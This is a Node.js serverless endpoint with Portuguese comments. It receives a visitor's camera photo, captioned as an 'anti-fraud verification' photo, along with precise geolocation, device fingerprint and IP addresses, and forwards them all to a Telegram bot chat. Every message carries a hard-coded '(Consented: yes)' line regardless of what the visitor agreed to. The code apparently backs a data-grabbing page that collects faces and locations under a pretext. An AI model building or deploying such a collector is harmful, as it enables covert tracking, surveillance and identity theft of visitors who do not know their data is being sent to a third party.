// /api/send.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ ok:false, error: 'Method not allowed' });
    return;
  }

  try {
    const body = req.body || {};
    const serverIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if(!token || !chatId){
      console.error('Missing TELEGRAM env vars');
      return res.status(500).json({ ok:false, error: 'telegram not configured' });
    }

    // Simplifique/escape strings para evitar problemas
    const esc = s => String(s || '').replaceAll('<','&lt;').replaceAll('>','&gt;');

    // ----------------------------------------------------
    // 1. TRATAMENTO E ENVIO DA FOTO (SE EXISTIR)
    // ----------------------------------------------------
    let messageId = null;
    let photoSent = false;
    const base64Image = body.photo;

    if (base64Image) {
      // A imagem Base64 virá no formato: data:image/jpeg;base64,.....
      // Para o Telegram, enviamos como URL no campo 'photo'.
      
      const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
          
      const photoResp = await fetch(photoUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          // Envia a string Base64 completa como valor do campo 'photo'
          // Nota: Isso só funciona com o Base64/data URI completo.
          photo: base64Image, 
          caption: '*Foto de Verificação Antifraude*', // Título opcional da foto
          parse_mode: 'Markdown'
        })
      });
      
      const photoJ = await photoResp.json().catch(() => ({}));
      
      if (photoResp.ok) {
        photoSent = true;
        messageId = photoJ.result?.message_id;
      } else {
        console.error('Telegram PHOTO error', photoResp.status, photoJ);
        // Se a foto falhar, continuamos para enviar o texto
      }
    }


    // ----------------------------------------------------
    // 2. MONTAGEM E ENVIO DO TEXTO COM DADOS
    // ----------------------------------------------------

    // Monta texto (Markdown)
    let text = `🔔 *Novo clique no botão*\n\n`;
    text += `📸 *Foto enviada:* ${photoSent ? 'SIM' : 'NÃO/FALHA'}\n`; // Feedback sobre a foto
    text += `\n--- DETALHES TÉCNICOS ---\n\n`;
    text += `🕒 _${new Date().toISOString()}_\n`;
    text += `🖥️ *UserAgent:* ${esc(body.userAgent)}\n`;
    text += `🌐 *Idioma:* ${esc(body.language)}\n`;
    text += `💻 *Plataforma:* ${esc(body.platform)}\n`;
    text += `📱 *Tela:* ${body.screen?.width || 'N/A'}x${body.screen?.height || 'N/A'}\n`;
    text += `🧠 *Memória (GB):* ${esc(body.deviceMemory)} • *CPU cores:* ${esc(body.hardwareConcurrency)}\n`;
    if(body.webgl?.renderer) text += `🎛️ *GPU:* ${esc(body.webgl.renderer)}\n`;
    if(body.connection) text += `📶 *Net:* ${esc(body.connection.effectiveType)} (${esc(body.connection.downlink)})\n`;
    if(body.geolocation){
      if(body.geolocation.error) text += `📍 *Geo:* permission:${esc(body.geolocation.error)}\n`;
      else text += `📍 *Geo:* ${body.geolocation.lat.toFixed(6)}, ${body.geolocation.lon.toFixed(6)} (acc ${body.geolocation.accuracy}m)\n`;
    }
    text += `🔎 *IP público (client):* ${esc(body.publicIp)}\n`;
    text += `🔒 *IP visto no servidor:* ${esc(serverIp)}\n`;
    text += `\n(Consented: yes)`;


    // chama Telegram API para o texto
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'Markdown'
      })
    });

    const j = await resp.json().catch(()=>({}));
    if(!resp.ok) {
      console.error('Telegram TEXT error', resp.status, j);
      return res.status(500).json({ ok:false, error:'telegram failed', details: j });
    }

    // Se o ID da foto foi capturado, use-o; senão, use o ID da mensagem de texto.
    if (!messageId) {
      messageId = j.result?.message_id || null;
    }

    // opcional: retorno de id para salvar no client
    return res.json({ ok:true, id: messageId });
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok:false, error: String(err) });
  }
}
